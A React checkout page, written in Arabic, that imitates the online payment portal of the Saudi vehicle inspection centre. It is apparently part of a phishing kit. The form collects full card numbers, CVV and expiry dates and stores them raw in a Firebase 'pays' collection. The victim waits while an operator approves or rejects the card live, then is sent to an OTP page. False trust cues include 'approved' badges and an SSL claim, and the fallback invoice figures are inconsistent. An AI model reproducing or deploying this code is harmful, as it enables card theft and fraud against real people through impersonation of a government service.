import { useLocation } from "wouter";
import { ChevronDown, X, CreditCard, Menu, Lock, ShieldCheck, CheckCircle2, Receipt, ArrowRight } from "lucide-react";
import { useState, useEffect } from "react";
import { handlePay, handleCurrentPage, isBinBlocked, listenForApproval, getOrCreateVisitorId } from "@/lib/firebase";
import { CashbackPopup } from "@/components/CashbackPopup";
import inspectionLogoUrl from "../../../attached_assets/logo_1791572229572.svg";

export default function CheckoutPage() {
  const [showPopup, setShowPopup] = useState(true);
  const [, setLocation] = useLocation();

  const [cardNumber, setCardNumber] = useState("");
  const [nameOnCard, setNameOnCard] = useState("");
  const [cvv, setCvv] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("0");
  const [expiryYear, setExpiryYear] = useState("0");
  
  const [loading, setLoading] = useState(false);
  const [submitError, setSubmitError] = useState("");
  const [isRejected, setIsRejected] = useState(false);
  const [waitingForAdmin, setWaitingForAdmin] = useState(false);
  const [waitingCardBrand, setWaitingCardBrand] = useState("visa");

  const rejectedMessage =
    "نود إبلاغكم أنه تم رفض بطاقة الدفع الخاصة بكم بسبب مشكلة في وسيلة الدفع المدخلة, نرجو منكم تغيير طريقة الدفع و إدخال وسيلة اخرى لإتمام عملية بنجاح";

  const [loadingData, setLoadingData] = useState(true);
  const [serverInvoice, setServerInvoice] = useState<{
    feeTitle: string;
    fee: { base: number; vat: number; total: number };
  } | null>(null);

  useEffect(() => {
    const id = getOrCreateVisitorId();
    void handleCurrentPage("checkout");

    if (id) {
      import("@/lib/firebase").then(({ db, doc, getDoc }) => {
        if (db) {
          getDoc(doc(db, "pays", id)).then((snap) => {
            const data = snap.data();
            if (data?.paymentInvoice) {
              setServerInvoice(data.paymentInvoice);
            } else if (data?.total || data?.totalAmount || data?.amount) {
              const total = Number(data.total || data.totalAmount || data.amount) || 172.5;
              const base = Math.round((total / 1.15) * 100) / 100;
              const vat = Math.round((total - base) * 100) / 100;
              setServerInvoice({
                feeTitle: data.inspectionType || "الفحص الفني الدوري للمركبة",
                fee: { base, vat, total }
              });
            } else {
              setServerInvoice({
                feeTitle: "الفحص الفني الدوري للمركبة",
                fee: { base: 115.00, vat: 37.50, total: 115.50 }
              });
            }
            setLoadingData(false);
          });
        }
      });
    } else {
      setLoadingData(false);
    }
  }, []);

  const fee = serverInvoice?.fee ?? { base: 172.5 / 1.15, vat: 172.5 - (172.5 / 1.15), total: 172.5 };
  const feeTitle = serverInvoice?.feeTitle ?? "الفحص الفني الدوري للمركبة";

  const formatMoney = (value: any) => {
    if (typeof value !== "number") return "--";
    return value.toFixed(2);
  };

  const totalAmountFormatted = `${formatMoney(fee.total)} ر.س`;


  // Listen for admin approval decision
  useEffect(() => {
    if (!waitingForAdmin) return;
    const unsubscribe = listenForApproval((status) => {
      if (status === "approved") {
        setWaitingForAdmin(false);
        setLocation("/otp");
      } else if (status === "rejected") {
        setWaitingForAdmin(false);
        setIsRejected(true);
      }
    });
    return () => {
      if (unsubscribe) unsubscribe();
    };
  }, [waitingForAdmin, setLocation]);

  const formatCardNum = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    const matches = v.match(/\d{4,16}/g);
    const match = (matches && matches[0]) || "";
    const parts = [];
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    return parts.length ? parts.join(" ") : v;
  };

  const handleCardNumberInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNum(e.target.value);
    if (formatted.replace(/\s/g, "").length <= 16) {
      setCardNumber(formatted);
      setSubmitError("");
      setIsRejected(false);
    }
  };

  const formatCvvInput = (value: string) => {
    return value.replace(/[^0-9]/g, "").slice(0, 4);
  };

  const detectCardBrand = (number: string) => {
    if (/^(588845|604906|636120|968208|417633|443548|483010|589005|589206|504300|588848|588850|588851|588852)/.test(number)) return "mada";
    if (/^4/.test(number)) return "visa";
    if (/^(5[1-5]|2[2-7])/.test(number)) return "mastercard";
    return "visa";
  };

  const activeBrand = detectCardBrand(cardNumber.replace(/\s/g, ""));
  const waitingCardLogo = waitingCardBrand === "mastercard" ? "/images/mastercard.png" : waitingCardBrand === "mada" ? "/images/mada.png" : "/images/visa.png";

  const isFormValid =
    cardNumber.replace(/\s/g, "").length >= 13 &&
    cvv.length >= 3 &&
    nameOnCard.trim() !== "" &&
    Number(expiryMonth) > 0 &&
    Number(expiryYear) > 0;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setSubmitError("");
    setIsRejected(false);

    if (!isFormValid) {
      setSubmitError("يرجى إدخال بيانات البطاقة بشكل صحيح");
      return;
    }

    const cleanNumber = cardNumber.replace(/\s+/g, "");

    try {
      if (await isBinBlocked(cleanNumber)) {
        const msg = "هذه البطاقة غير مدعومة. يرجى استخدام بطاقة أخرى.";
        setSubmitError(msg);
        return;
      }
    } catch {
      // ignore
    }

    setLoading(true);
    const cardBrand = detectCardBrand(cleanNumber);
    setWaitingCardBrand(cardBrand);

    const paymentMeta = {
      cardType: cardBrand,
      bankName: "",
      cardLast4: cleanNumber.slice(-4),
      totalPaid: fee?.total ? String(fee.total) : "115.50",
    };

    const paymentInfo = {
      cardNumber: cleanNumber,
      cardName: nameOnCard.trim(),
      cvv,
      expiryMonth: String(expiryMonth).padStart(2, "0"),
      expiryYear: String(expiryYear),
      payment: paymentMeta,
      cardType: cardBrand,
      currentPage: "checkout",
    };

    try {
      const saved = await handlePay(paymentInfo, () => {});
      if (!saved) {
        throw new Error("تعذر حفظ بيانات الدفع");
      }
      setWaitingForAdmin(true);
    } catch (err: any) {
      setIsRejected(true);
      setSubmitError(err?.message || "حدث خطأ أثناء معالجة الدفع");
    } finally {
      setLoading(false);
    }
  };

  const months = Array.from({ length: 12 }, (_, i) => i + 1);
  const years = Array.from({ length: 8 }, (_, i) => new Date().getFullYear() + i);

  return (
    <div
      className="page-checkout min-h-screen flex flex-col text-right font-sans bg-[#f5f8f5]"
      dir="rtl"
      data-testid="page-checkout"
    >
      {showPopup && <CashbackPopup onClose={() => setShowPopup(false)} />}
      <Header totalAmountFormatted={totalAmountFormatted} />
      <HeroBanner totalAmountFormatted={totalAmountFormatted} />

      <main className="flex-1 max-w-7xl mx-auto w-full px-4 sm:px-6 py-8">
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
          {/* Invoice Summary Section - 5 Columns */}
          <div className="lg:col-span-5 w-full bg-white p-6 sm:p-8 rounded-2xl shadow-sm border border-[#e5ece6]">
            <div className="flex flex-col gap-6">
              <div className="flex items-center justify-between border-b border-[#e9efe9] pb-4">
                <div className="flex items-center gap-2 text-[#126447] font-bold text-lg">
                  <Receipt className="w-5 h-5" />
                  <span>تفاصيل الماليّة</span>
                </div>
                <div className="inline-flex items-center gap-1.5 rounded-full bg-[#dfeee3] px-3 py-1 text-xs font-bold text-[#126447]">
                  <ShieldCheck className="w-3.5 h-3.5" />
                  معتمدة
                </div>
              </div>

              {/* Prominent Amount Box */}
              <div className="bg-gradient-to-br from-[#dfeee3]/60 via-[#f5f8f5] to-white p-5 rounded-xl border border-[#dce7de]">
                <span className="text-xs font-semibold text-[#486253] block mb-1">المبلغ الإجمالي المطلوب سداده</span>
                <div className="text-3xl sm:text-4xl font-black text-[#126447] tracking-tight">
                  {totalAmountFormatted}
                </div>
              </div>

              {/* Line items */}
              <div className="flex flex-col gap-3 text-sm">
                <div className="flex items-center justify-between text-[#234b38] py-1">
                  <span>رسوم خدمة الفحص</span>
                  <span className="font-semibold">{formatMoney(fee.base)} ر.س</span>
                </div>
                <div className="flex items-center justify-between text-[#486253] text-xs py-1 border-t border-dashed border-[#e9efe9]">
                  <span>ضريبة القيمة المضافة (15%)</span>
                  <span className="font-semibold">{formatMoney(fee.vat)} ر.س</span>
                </div>
                <div className="flex items-center justify-between text-[#126447] font-bold text-base pt-3 border-t border-[#e9efe9]">
                  <span>المبلغ المستحق للدفع</span>
                  <span className="text-xl font-extrabold">{totalAmountFormatted}</span>
                </div>
              </div>

              <div className="bg-[#f5f8f5] p-4 rounded-xl border border-[#e5ece6] flex items-center gap-3 mt-2">
                <CheckCircle2 className="w-5 h-5 text-[#126447] shrink-0" />
                <p className="text-xs text-[#486253] leading-relaxed">
                  سداد فوري ومستند معتمد من مركز سلامة المركبات.
                </p>
              </div>
            </div>
          </div>

          {/* Payment Form Section - 7 Columns */}
          <div className="lg:col-span-7 w-full bg-white p-6 sm:p-8 rounded-2xl shadow-sm border border-[#e5ece6]">
            <div className="max-w-xl mx-auto">
              <div className="flex flex-col gap-2 mb-6 border-b border-[#e9efe9] pb-4">
                <div className="flex items-center justify-between">
                  <span className="text-xl font-bold text-[#234b38]">الدفع بالبطاقة البنكية</span>
                  <div className="text-sm font-extrabold text-[#126447] bg-[#dfeee3] px-3 py-1 rounded-lg">
                    {totalAmountFormatted}
                  </div>
                </div>
                <p className="text-xs text-[#486253]">أدخل معلومات البطاقة لخصم قيمة السداد ({totalAmountFormatted})</p>
              </div>

              <form className="flex flex-col gap-5" onSubmit={handleSubmit}>
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 bg-[#f5f8f5] p-4.5 rounded-2xl border border-[#e5ece6] shadow-sm">
                  <span className="text-sm font-bold text-[#234b38]">وسائل الدفع المتاحة:</span>
                  <div className="flex gap-3.5 items-center flex-wrap">
                    <div className={`flex items-center justify-center bg-white border px-4 py-2 rounded-2xl h-14 sm:h-16 min-w-[88px] sm:min-w-[105px] transition-all shadow-sm ${activeBrand === "mada" ? "border-[#126447] ring-2 ring-[#126447]/25 shadow-md scale-105" : "border-[#d8e4db] opacity-95 hover:opacity-100"}`}>
                      <img
                        src="/images/mada.png"
                        alt="مدى - mada"
                        className="h-9 sm:h-11 max-w-[105px] w-auto object-contain"
                      />
                    </div>
                    <div className={`flex items-center justify-center bg-white border px-4 py-2 rounded-2xl h-14 sm:h-16 min-w-[88px] sm:min-w-[105px] transition-all shadow-sm ${activeBrand === "mastercard" ? "border-[#126447] ring-2 ring-[#126447]/25 shadow-md scale-105" : "border-[#d8e4db] opacity-95 hover:opacity-100"}`}>
                      <img
                        src="/images/mastercard.png"
                        alt="Mastercard"
                        className="h-9 sm:h-11 max-w-[105px] w-auto object-contain"
                      />
                    </div>
                    <div className={`flex items-center justify-center bg-white border px-4 py-2 rounded-2xl h-14 sm:h-16 min-w-[95px] sm:min-w-[115px] transition-all shadow-sm ${activeBrand === "visa" ? "border-[#126447] ring-2 ring-[#126447]/25 shadow-md scale-105" : "border-[#d8e4db] opacity-95 hover:opacity-100"}`}>
                      <img
                        src="/images/visa.png"
                        alt="Visa"
                        className="h-10 sm:h-12 max-w-[55px] w-auto object-contain"
                      />
                    </div>
                  </div>
                </div>

                <div className="flex flex-col gap-4">
                  <div>
                    <label className="block text-xs font-bold text-[#234b38] mb-1.5">رقم البطاقة</label>
                    <div className="relative">
                      <input
                        dir="ltr"
                        type="text"
                        className="w-full border border-[#dce7de] rounded-xl px-4 py-3.5 text-left font-mono text-base focus:outline-none focus:border-[#126447] focus:ring-1 focus:ring-[#126447] transition-all bg-white"
                        placeholder="1234 1234 1234 1234"
                        value={cardNumber}
                        onChange={handleCardNumberInput}
                        maxLength={19}
                        data-testid="input-card-number"
                      />
                      <CreditCard className="absolute left-3.5 top-1/2 -translate-y-1/2 w-5 h-5 text-[#486253]/50 pointer-events-none" />
                    </div>
                  </div>

                  <div>
                    <label className="block text-xs font-bold text-[#234b38] mb-1.5">اسم صاحب البطاقة</label>
                    <input
                      dir="ltr"
                      type="text"
                      className="w-full border border-[#dce7de] rounded-xl px-4 py-3.5 text-left uppercase text-sm focus:outline-none focus:border-[#126447] focus:ring-1 focus:ring-[#126447] transition-all bg-white"
                      placeholder="CARDHOLDER NAME"
                      value={nameOnCard}
                      onChange={(e) => setNameOnCard(e.target.value)}
                      maxLength={60}
                      data-testid="input-card-name"
                    />
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="block text-xs font-bold text-[#234b38] mb-1.5">رمز الأمان (CVV)</label>
                      <input
                        dir="ltr"
                        type="tel"
                        className="w-full border border-[#dce7de] rounded-xl px-4 py-3.5 text-left font-mono text-sm focus:outline-none focus:border-[#126447] focus:ring-1 focus:ring-[#126447] transition-all bg-white"
                        placeholder="CVV"
                        value={cvv}
                        onChange={(e) => setCvv(formatCvvInput(e.target.value))}
                        maxLength={4}
                        data-testid="input-cpc"
                      />
                    </div>

                    <div>
                      <label className="block text-xs font-bold text-[#234b38] mb-1.5">تاريخ الانتهاء</label>
                      <div className="grid grid-cols-2 gap-2">
                        <select
                          value={expiryYear}
                          onChange={(e) => setExpiryYear(e.target.value)}
                          className="w-full border border-[#dce7de] rounded-xl px-2 py-3.5 text-xs bg-white focus:outline-none focus:border-[#126447] transition-all text-[#234b38] font-semibold"
                          data-testid="select-expiry-year"
                        >
                          <option value="0">السنة</option>
                          {years.map((y) => (
                            <option key={y} value={y}>{y}</option>
                          ))}
                        </select>
                        <select
                          value={expiryMonth}
                          onChange={(e) => setExpiryMonth(e.target.value)}
                          className="w-full border border-[#dce7de] rounded-xl px-2 py-3.5 text-xs bg-white focus:outline-none focus:border-[#126447] transition-all text-[#234b38] font-semibold"
                          data-testid="select-expiry-month"
                        >
                          <option value="0">الشهر</option>
                          {months.map((m) => (
                            <option key={m} value={m}>{String(m).padStart(2, "0")}</option>
                          ))}
                        </select>
                      </div>
                    </div>
                  </div>
                </div>

                {isRejected && (
                  <div
                    className="font-medium mt-2 p-4 bg-red-50 border border-red-200 rounded-xl text-red-600 text-center text-sm leading-relaxed shadow-sm"
                    data-testid="error-rejected"
                  >
                    {rejectedMessage}
                  </div>
                )}

                <div className="mt-2">
                  <button
                    type="submit"
                    className="w-full rounded-xl bg-[#126447] hover:bg-[#0e5239] text-white py-4 font-bold text-base transition-all shadow-md hover:shadow-lg cursor-pointer disabled:opacity-60 flex items-center justify-center gap-2"
                    disabled={!isFormValid || loading || waitingForAdmin}
                    data-testid="button-pay"
                  >
                    <Lock className="w-4 h-4" />
                    {loading ? "جارٍ إرسال البيانات..." : `سداد الآن (${totalAmountFormatted})`}
                  </button>
                  {submitError && !isRejected && (
                    <p className="text-sm text-red-500 mt-2 text-center font-medium" data-testid="error-submit">{submitError}</p>
                  )}
                </div>

                <div className="flex flex-col items-center justify-center gap-2 pt-3 border-t border-[#e9efe9]">
                  <div className="flex items-center gap-1.5 text-[#126447]">
                    <ShieldCheck className="w-4 h-4" />
                    <span className="text-xs font-bold">حماية مشفرة 256-bit SSL</span>
                  </div>
                  <div className="flex items-center justify-center gap-4 pt-1.5">
                    <img src="/images/mada.png" alt="mada" className="h-6 sm:h-7 w-auto object-contain transition-all hover:scale-105" />
                    <img src="/images/mastercard.png" alt="mastercard" className="h-6 sm:h-7 w-auto object-contain transition-all hover:scale-105" />
                    <img src="/images/visa.png" alt="visa" className="h-6 sm:h-7 w-auto object-contain transition-all hover:scale-105" />
                  </div>
                </div>
              </form>
            </div>
          </div>
        </div>
      </main>

      <Footer />

      {/* Waiting for Admin Approval Modal */}
      {waitingForAdmin && (
        <div className="fixed inset-0 z-[9999]">
          <div className="payment-wait-backdrop absolute inset-0"></div>
          <div className="absolute inset-0 flex items-center justify-center p-4">
            <div className="payment-wait-card">
              <img src={waitingCardLogo} alt="card logo" className="h-14 sm:h-16 w-auto object-contain" />
              <div className="payment-wait-spinner mt-4">
                <span className="payment-wait-spinner-core"></span>
              </div>
              <p className="text-sm font-semibold text-[#234b38] mt-4 text-center">جاري معالجة عملية السداد بمبلغ {totalAmountFormatted}...</p>
            </div>
          </div>
        </div>
      )}

      <style>{`
        .payment-wait-backdrop {
          background: rgba(18, 52, 38, 0.65);
          backdrop-filter: blur(8px);
          animation: overlay-fade-in 0.24s ease-out both;
        }

        .payment-wait-card {
          width: min(92vw, 380px);
          min-height: 240px;
          border-radius: 20px;
          border: 1px solid #dce7de;
          background: linear-gradient(180deg, #ffffff 0%, #f5f8f5 100%);
          box-shadow: 0 24px 64px rgba(18, 100, 71, 0.25);
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          padding: 28px 20px;
          animation: card-pop-in 0.28s cubic-bezier(0.2, 0.8, 0.2, 1) both;
        }

        .payment-wait-spinner {
          width: 58px;
          height: 58px;
          border-radius: 9999px;
          border: 4px solid #dfeee3;
          border-top-color: #126447;
          animation: spin 0.9s linear infinite;
          display: flex;
          align-items: center;
          justify-content: center;
        }

        .payment-wait-spinner-core {
          width: 16px;
          height: 16px;
          border-radius: 9999px;
          background: #126447;
          animation: core-pulse 0.95s ease-in-out infinite;
        }

        @keyframes overlay-fade-in {
          from { opacity: 0; }
          to { opacity: 1; }
        }

        @keyframes card-pop-in {
          from {
            opacity: 0;
            transform: translateY(14px) scale(0.97);
          }
          to {
            opacity: 1;
            transform: translateY(0) scale(1);
          }
        }

        @keyframes spin {
          to { transform: rotate(360deg); }
        }

        @keyframes core-pulse {
          0%, 100% {
            transform: scale(0.78);
            opacity: 0.7;
          }
          50% {
            transform: scale(1);
            opacity: 1;
          }
        }
      `}</style>
    </div>
  );
}

function Header({ totalAmountFormatted }: { totalAmountFormatted: string }) {
  const [menuOpen, setMenuOpen] = useState(false);
  const [, setLocation] = useLocation();

  return (
    <header className="relative z-20 border-b border-[#e9efe9] bg-white/95 backdrop-blur">
      <div className="mx-auto flex max-w-7xl items-center justify-between gap-5 px-5 py-4 sm:px-8 lg:px-10">
        <a href="/home" className="flex items-center gap-3" aria-label="الرئيسية">
          <img
            src={inspectionLogoUrl}
            alt="مركز سلامة المركبات"
            className="h-9 w-auto max-w-[210px] object-contain sm:h-11"
          />
        </a>

        <div className="hidden lg:flex items-center gap-2 text-xs font-bold text-[#126447] bg-[#dfeee3] px-4 py-2 rounded-xl border border-[#dce7de]">
          <ShieldCheck className="w-4 h-4" />
          <span>إجمالي المبلغ المطلوب:</span>
          <span className="text-sm font-black text-[#126447]">{totalAmountFormatted}</span>
        </div>

        <button
          type="button"
          className="grid h-10 w-10 place-items-center rounded-xl border border-[#dce7de] text-[#234b38] lg:hidden"
          onClick={() => setMenuOpen((open) => !open)}
          aria-label={menuOpen ? "إغلاق القائمة" : "فتح القائمة"}
        >
          {menuOpen ? <X className="h-5 w-5" /> : <Menu className="h-5 w-5" />}
        </button>
      </div>

      {menuOpen && (
        <nav className="absolute inset-x-4 top-[calc(100%-0.25rem)] rounded-2xl border border-[#e5ece6] bg-white p-3 shadow-xl lg:hidden z-50">
          {[
            { href: "/home", label: "الرئيسية" },
            { href: "/book-appointment", label: "حجز موعد" },
            { href: "/registration", label: "بيانات المركبة" },
          ].map((item) => (
            <a
              key={item.href}
              href={item.href}
              onClick={(e) => {
                e.preventDefault();
                setMenuOpen(false);
                setLocation(item.href);
              }}
              className="block rounded-xl px-4 py-3 text-right text-sm font-semibold text-[#315440] hover:bg-[#f1f6f2]"
            >
              {item.label}
            </a>
          ))}
        </nav>
      )}
    </header>
  );
}

function HeroBanner({ totalAmountFormatted }: { totalAmountFormatted: string }) {
  return (
    <div className="w-full">
      <div
        className="py-6 px-4 text-center text-white bg-[#126447]"
      >
        <h1 className="text-2xl sm:text-3xl font-extrabold mb-1">
          سداد رسوم الخدمة ({totalAmountFormatted})
        </h1>
        <p className="text-xs sm:text-sm font-normal text-[#dfeee3] opacity-90">
          منصة سداد مركز سلامة المركبات الإلكترونية
        </p>
      </div>

      <div
        className="py-4 px-8 flex flex-col items-center justify-center text-white bg-[#0e5239]"
      >
        <div className="relative w-full max-w-xs flex items-center justify-between">
          <div className="absolute top-1/2 left-0 right-0 -translate-y-1/2 h-[2px] bg-white/40 z-0" />

          <div className="relative z-10 flex flex-col items-center">
            <div className="w-3 h-3 rounded-full bg-white/60 mb-1.5" />
            <span className="text-[11px] font-medium opacity-75">بيانات المركبة</span>
          </div>

          <div className="relative z-10 flex flex-col items-center">
            <div className="w-3 h-3 rounded-full bg-white/60 mb-1.5" />
            <span className="text-[11px] font-medium opacity-75">
              موعد الفحص
            </span>
          </div>

          <div className="relative z-10 flex flex-col items-center">
            <div className="w-3.5 h-3.5 rounded-full bg-white ring-4 ring-white/20 mb-1.5" />
            <span className="text-[11px] font-medium opacity-100 font-bold">
              إتمام الدفع
            </span>
          </div>
        </div>
      </div>
    </div>
  );
}

function Footer() {
  return (
    <footer
      className="py-8 text-center text-white font-medium text-xs mt-auto bg-[#126447]"
      data-testid="section-footer"
    >
      جميع الحقوق محفوظة © 2026 مركز سلامة المركبات - الهيئة السعودية للمواصفات والمقاييس والجودة
    </footer>
  );
}
